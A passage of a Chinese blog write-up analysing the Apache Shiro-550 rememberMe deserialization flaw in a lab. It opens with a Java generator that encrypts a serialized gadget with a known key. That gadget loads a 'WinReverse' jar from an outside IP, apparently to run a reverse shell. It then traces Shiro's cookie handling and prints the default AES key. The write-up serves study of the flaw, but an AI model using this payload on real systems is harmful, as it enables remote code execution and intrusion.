class="type">Base64</span> <span class="variable">B64</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.shiro.codec.Base64();</span><br><span class="line">        <span class="type">byte</span>[] key = B64.decode(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>);</span><br><span class="line">        <span class="comment">//反序列化payload的base64编码</span></span><br><span class="line">        java.lang.<span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNlZoRH/BzETxgCAAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3VyY2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAdJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xEYXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNvdXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABRmYWN0b3J5Q2xhc3NMb2NhdGlvbnEAfgAETAANaWRlbnRpdHlUb2tlbnEAfgAETAADcGNzdAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAA3Zjc3QAIkxqYXZhL2JlYW5zL1ZldG9hYmxlQ2hhbmdlU3VwcG9ydDt4cHcCAAFzcgA9Y29tLm1jaGFuZ2UudjIubmFtaW5nLlJlZmVyZW5jZUluZGlyZWN0b3IkUmVmZXJlbmNlU2VyaWFsaXplZGIZhdDRKsITAgAETAALY29udGV4dE5hbWV0ABNMamF2YXgvbmFtaW5nL05hbWU7TAADZW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAEbmFtZXEAfgAJTAAJcmVmZXJlbmNldAAYTGphdmF4L25hbWluZy9SZWZlcmVuY2U7eHBwcHBzcgAWamF2YXgubmFtaW5nLlJlZmVyZW5jZejGnqKo6Y0JAgAETAAFYWRkcnN0ABJMamF2YS91dGlsL1ZlY3RvcjtMAAxjbGFzc0ZhY3RvcnlxAH4ABEwAFGNsYXNzRmFjdG9yeUxvY2F0aW9ucQB+AARMAAljbGFzc05hbWVxAH4ABHhwc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQACldpblJldmVyc2V0ACpodHRwOi8vMTkyLjE2OC4xMzcuMjM4OjY2NjYvV2luUmV2ZXJzZS5qYXJ0AAdleHBsb2l0cHBwdwQAAAAAeHcCAAF4&quot;</span>;</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipherService</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(B64.decode(text), key);</span><br><span class="line">        <span class="type">byte</span>[] value = byteSource.getBytes();</span><br><span class="line">        System.out.println(<span class="string">&quot;rememberMe=&quot;</span>+<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(B64.encode(value)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-漏洞原理"><a href="#5-漏洞原理" class="headerlink" title="5.漏洞原理"></a>5.漏洞原理</h1><p><strong>漏洞产生大致流程</strong></p>
+<p>Shiro 550反序列化漏洞存在版本：<strong>shiro&lt;1.2.4</strong>，产生原因是因为shiro接受了Cookie里面’<strong>rememberMe</strong>‘的值，然后去进行<strong>Base64</strong>解密后，再使用<strong>AES</strong>密钥解密后的数据，进行反序列化。</p>
+<p>反过来思考一下，如果我们构造该值为一个cc链序列化后的值进行该密钥AES加密后进行 Base64加密，那么这时候就会去进行反序列化我们的payload内容，这时候就可以达到一个命令执行的效果。</p>
+<p>‍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作</span><br></pre></td></tr></table></figure>
+
+<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令=&gt;序列化=&gt;AES加密=&gt;<span class="built_in">base64</span>编码=&gt;RememberMe Cookie值</span><br></pre></td></tr></table></figure>
+
+<p>首先找到硬编码key的位置。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org/apache/shiro/mgt/AbstractRememberMeManager.java</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318205334-9lh4utv.png" class="" title="image">
+
+<p>向上溯源：找到 RememberMeManager 类的 onSuccessfulLogin 方法</p>
+<p>onSuccessfulLogin : 处理成功登录的过程</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318212908-kvwu5o2.png" class="" title="image">
+
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318212955-j3mlefx.png" class="" title="image">
+
+<p>在这里下一个断点，调试运行。</p>
+<p>浏览器登录，查看 调试信息。</p>
+<p>使用账号密码‘root&#x2F;secret’登录,勾选<strong>Remember Me</strong>字段。</p>
+<p>在断点处拦截到请求，其中‘forgetIdentity’作用是在响应包的Set-Cookie中添加‘deleteMe’字段。</p>
+<p>继续跟进 this.forgetIdentity 方法，进入了 getCookie 的 removeFrom 方法</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319171836-ktxc3oq.png" class="" title="image">
+
+<p>这里获取看配置信息，最后 addCookieHeader 放到了返回包中的 cookie 头中，</p>
+<p>其中就有熟悉的 deleteMe 字段和 rememberMe 字段。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319172039-6tphv42.png" class="" title="image">
+
+<p>继续回到 onSuccessfulLogin 方法，这个 isRememberMe 主要是检查是否选择了 remember me 按钮。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319172333-xn8udz5.png" class="" title="image">
+
+<p>跟进‘rememberIdentity’,其中对登录账号进行encrypt且序列化处理。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319172643-pyyhrfs.png" class="" title="image">
+
+<p>进入 convertPrincipalsToBytes 方法，发现它会序列化，而且序列化的是传入的 root 用户名。然后就是进行普通的序列化操作，再然后调用 encrypto 方法加密序列化后的二进制字节</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319173203-7ovjkzc.png" class="" title="image">
+
+<p>在encrypt中稍微跟进一下看看流程。</p>
+<p>通过‘getCipherService’获取加密方式等信息</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319173352-3i1mfqr.png" class="" title="image">
+
+<p>而在该类的构造函数中就已经设定了<strong>DEFAULT_CIPHER_KEY_BYTES</strong>的值即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>
+
+<p>最终在encryptionCipherKey中设置该key的bytes</p>
+<p>通过getEncryptionKey返回该key，加密序列化字符串</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319173501-m549znn.png" class="" title="image">
+
+<p>回到 <strong>rememberIdentity</strong> 方法，跟进 <strong>rememberSerializedIdentity</strong> 方法，进行 <strong>SetCookie</strong></p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319173611-8vofegy.png" class="" title="image">
+
+<p>最终在‘org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.java’最后对加密序列化字符串进行base64编码后设置Cookie返回。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319173704-s29o3sd.png" class="" title="image">
+
+<h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作</span><br></pre></td></tr></table></figure>
+
+<p>在‘org&#x2F;apache&#x2F;shiro&#x2F;mgt&#x2F;AbstractRememberMeManager.java’中的‘getRememberPrincipals’方法打断点。</p>
+<p>从注释就可以看到这个函数是干什么的，这里是将rememberMe的值重建为principals值的。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319175042-p9cmbuw.png" class="" title="image">
+
+<p>发送payload包，进行调试。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319175540-gikwngq.png" class="" title="image">
+
+<p>先对接受到的cookie中的<code>rememberMe</code>​的值进行base64解码。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319175710-x43zsk5.png" class="" title="image">
+
+<p>再次回到 AbstractRememberMeManager 类中，从‘subjectContext’中获取‘rememberMe’的值之后跟进‘convertBytesToPrincipals’函数。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319180110-7wi5kgl.png" class="" title="image">
+
+<p>进入 convertBytesToPrincipals 方法，这就是对应加密的解析数据，中间肯定要解密数据，继续跟入，跟进 decrypt 解密函数。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319180205-ofxfnyl.png" class="" title="image">
+
+<p>getCipherService () 获取 加解密 方法，<code>AES/CBC/PKCS5Padding</code>​，getDecryptionCipherKey () 获取 解密 KEY , <code>kPH+bIxk5D2deZiIxcaaaA==</code>​。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319180245-mq0yvdt.png" class="" title="image">
+
+<p>经过解密获取序列化字符串后，进入‘deserialize’函数进行反序列化。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319180454-qcj819v.png" class="" title="image">
+
+<p>最终通过‘readObject’函数将攻击者构造的payload进行反序列化。</p>
+<p><code>&lt;u&gt;readObject&lt;/u&gt;</code>​<u>​ 函数通常用于从流中读取对象并将其反序列化。</u></p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319182050-5527wwt.png" class="" title="image">
+
+<p>触发‘CommonsCollections2’链条构造的calc命令，成功弹出计算器。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240319182134-yiyrb38.png" class="" title="image">
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://wh0is.xyz/articles/a27657b2/">https://wh0is.xyz/articles/a27657b2/</a></p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://YTyyds.github.io">YTZeri</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ytyyds.github.io/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">https://ytyyds.github.io/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://YTyyds.github.io" target="_blank">事在人为</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/Avatar1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/09/cemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="cemu环境搭建"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">cemu环境搭建</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Avatar1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YTZeri</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63301206?spm=1010.2135.3001.5343"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Shiro漏洞分析及利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Shiro%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">1.Shiro概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">2.环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-IDEA-%E8%BF%9B%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.0.1.</span> <span class="toc-text">使用 IDEA 进行环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDEA%E9%85%8D%E7%BD%AEtomcat"><span class="toc-number">3.0.2.</span> <span class="toc-text">IDEA配置tomcat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8Vulhub-Docker%E6%90%AD%E5%BB%BA"><span class="toc-number">4.</span> <span class="toc-text">3.使用Vulhub Docker搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text">4.漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC"><span class="toc-number">5.1.</span> <span class="toc-text">python脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8java%E7%94%9F%E6%88%90payload"><span class="toc-number">5.2.</span> <span class="toc-text">使用java生成payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">5.漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-number">6.2.</span> <span class="toc-text">反序列化过程</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Shiro漏洞分析及利用">Shiro漏洞分析及利用</a><time datetime="2024-03-19T11:14:01.941Z" title="发表于 2024-03-19 19:14:01">2024-03-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/09/cemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="cemu环境搭建">cemu环境搭建</a><time datetime="2024-01-09T09:19:37.078Z" title="发表于 2024-01-09 17:19:37">2024-01-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集1">信息收集1</a><time datetime="2023-10-23T12:48:11.037Z" title="发表于 2023-10-23 20:48:11">2023-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/" title="小常识">小常识</a><time datetime="2023-10-23T12:47:35.119Z" title="发表于 2023-10-23 20:47:35">2023-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><time datetime="2023-10-23T12:29:18.673Z" title="发表于 2023-10-23 20:29:18">2023-10-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const disqus_config = function () {
+    this.page.url = 'https://ytyyds.github.io/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/'
+    this.page.identifier = '/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/'
+    this.page.title = 'Shiro漏洞分析及利用'
+  }
+
+  const disqusReset = () => {
+    window.DISQUS && window.DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addGlobalFn('themeChange', disqusReset, 'disqus')
+
+  const loadDisqus = () =>{
+    if (window.DISQUS) disqusReset()
+    else {
+      const script = document.createElement('script')
+      script.src = 'https://YTZeri.disqus.com/embed.js'
+      script.setAttribute('data-timestamp', +new Date())
+      document.head.appendChild(script)
+    }
+  }
+
+  const getCount = async() => {
+    try {
+      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
+      if (!eleGroup) return
+      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')
+
+      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=YTZeri&api_key=&thread:link=${cleanedLinks}`,{
+        method: 'GET'
+      })
+      const result = await res.json()
+
+      const count = result.response.length ? result.response[0].posts : 0
+      eleGroup.textContent = count
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  if ('Disqus' === 'Disqus' || !false) {
+    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+    else {
+      loadDisqus()
+      
+    }
+  } else {
+    window.loadOtherComment = loadDisqus
+  }
+})()</script></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<code>.*?<\/code>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    fetch('https://disqus.com/api/3.0/forums/listPosts.json?forum=YTZeri&related=thread&limit=6&api_key=')
+      .then(response => response.json())
+      .then(data => {
+        const disqusArray = data.response.map(item => {
+          return {
+            'avatar': item.author.avatar.cache,
+            'content': changeContent(item.message),
+            'nick': item.author.name,
+            'url': item.url,
+            'date': item.createdAt
+          }
+        })
+
+        saveToLocal.set('disqus-newest-comments', JSON.stringify(disqusArray), 10/(60*24))
+        generateHtml(disqusArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick}</span><time> / ${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('disqus-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><div class="aplayer no-destroy" data-id="7422861869" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-lrcType="-1"> </div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
